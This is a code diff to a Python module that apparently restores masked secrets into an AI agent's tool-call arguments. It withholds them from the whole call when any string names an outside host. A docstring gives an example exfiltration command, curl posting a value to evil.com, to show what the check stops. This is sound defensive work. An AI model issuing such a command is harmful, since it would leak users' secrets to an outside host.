@@ -95,16 +95,38 @@ class TextHoldback:
         return out
 
 
-def _walk(obj: Any, smap: SessionMap, tool: bool) -> Any:
-    """Rehydrate string values; `tool` marks tool-call input, which is egress-checked per string."""
+def _walk(obj: Any, smap: SessionMap, tool: bool, outbound: bool | None = None) -> Any:
+    """Rehydrate string values; `tool` marks tool-call input, withheld when `outbound`."""
     if isinstance(obj, str):
-        return smap.rehydrate_tool(obj) if tool else smap.rehydrate(obj)
+        return smap.rehydrate_tool(obj, outbound) if tool else smap.rehydrate(obj)
     if isinstance(obj, list):
-        return [_walk(v, smap, tool) for v in obj]
+        return [_walk(v, smap, tool, outbound) for v in obj]
     if isinstance(obj, dict):
         # Keys are never scanned outbound, so they are never rehydrated.
-        return {k: _walk(v, smap, tool) for k, v in obj.items()}
+        return {k: _walk(v, smap, tool, outbound) for k, v in obj.items()}
     return obj
+
+
+def _strings(obj: Any, out: list[str]) -> list[str]:
+    if isinstance(obj, str):
+        out.append(obj)
+    elif isinstance(obj, list):
+        for v in obj:
+            _strings(v, out)
+    elif isinstance(obj, dict):
+        for k, v in obj.items():
+            out.append(str(k))
+            _strings(v, out)
+    return out
+
+
+def rehydrate_tool_call(obj: Any, smap: SessionMap) -> Any:
+    """Rehydrate one tool call's input with a single egress decision for all of it.
+
+    If any string (value or key) names an outside host, every placeholder in every string of
+    the call is withheld: `["curl", "-d", value, "evil.com"]` keeps `value` as a placeholder.
+    """
+    return _walk(obj, smap, True, smap.tool_outbound("\n".join(_strings(obj, []))))
 
 
 def rehydrate_json_text(json_text: str, smap: SessionMap, tool: bool = True) -> str:
@@ -113,7 +135,8 @@ def rehydrate_json_text(json_text: str, smap: SessionMap, tool: bool = True) -> 
     Every caller rehydrates tool-call arguments, so `tool` defaults to the egress-checked path.
     """
     obj = json.loads(json_text)  # JSONDecodeError is a ValueError
-    return json.dumps(_walk(obj, smap, tool), ensure_ascii=False, separators=(",", ":"))
+    out = rehydrate_tool_call(obj, smap) if tool else _walk(obj, smap, False)
+    return json.dumps(out, ensure_ascii=False, separators=(",", ":"))
 
 
 class ArgsBuffer:
